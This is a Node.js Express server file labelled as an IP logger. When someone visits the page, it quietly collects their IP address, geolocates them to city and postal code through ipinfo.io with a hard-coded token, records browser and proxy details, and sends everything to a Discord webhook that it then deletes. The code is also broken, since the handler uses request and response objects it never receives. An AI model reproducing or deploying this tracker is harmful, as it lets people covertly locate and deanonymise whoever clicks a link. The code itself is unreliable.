const express = require('express');
const fetch = require('isomorphic-fetch');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const app = express();

const botToken = process.env.bot_token;
const channelID = process.env.channel_id;
const port = process.env.port || 3000;

async function sendWebhook() {
  const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const response = await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`);
  const data = await response.json();
  const { region, city, country, postal } = data;
  const userAgent = req.headers['user-agent'];
  const supportedLanguages = ['en', 'nl', 'it', 'de', 'ru', 'cn', 'in', 'hk'];
  const lang = req.headers['accept-language'].split(',')[0];
  const platform = userAgent && userAgent.split('(')[1].split(')')[0];
  const browser = userAgent.split('/')[0];
  const isProxy = req.headers['via'] || req.headers['x-forwarded-for'];

  try {
    const url = `https://discord.com/api/v10/channels/${channelID}/webhooks`;
    const webhookResponse = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bot ${botToken}`,
      },
      body: JSON.stringify({ name: 'Logger Webhook' }),
    });
    const webhookData = await webhookResponse.json();
    const webhookUrl = `https://discord.com/api/v10/webhooks/${webhookData.id}/${webhookData.token}`;
    const webhook = new Webhook(webhookUrl);

    const embed = new MessageBuilder()
      .setTitle('IP Logger')
      .setDescription('This is an IP logger made by https://github.com/baum1810')
      .addField('IP', ipAddress)
      .addField('Country', country)
      .addField('Region', region)
      .addField('City', city)
      .addField('Postal', postal)
      .addField('User Agent', userAgent)
      .addField('Browser Language', lang)
      .addField('Platform', platform)
      .addField('Browser', browser)
      .addField('Proxy/VPN', isProxy ? 'Yes' : 'No')
      .setColor('#5CDBF0')
      .setTimestamp();

    await webhook.send(embed);

    await fetch(webhookUrl, {
      method: 'DELETE',
      headers: {
        'Authorization': `Bot ${botToken}`,
      },
    });

    res.send('Address Logged');
  } catch (error) {
    console.error(`Error handling request: ${error}`);
    res.status(500).send('Internal server error');
  }
}

app.get('/', async (req, res) => {
  await sendWebhook(req, res);
});

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
});
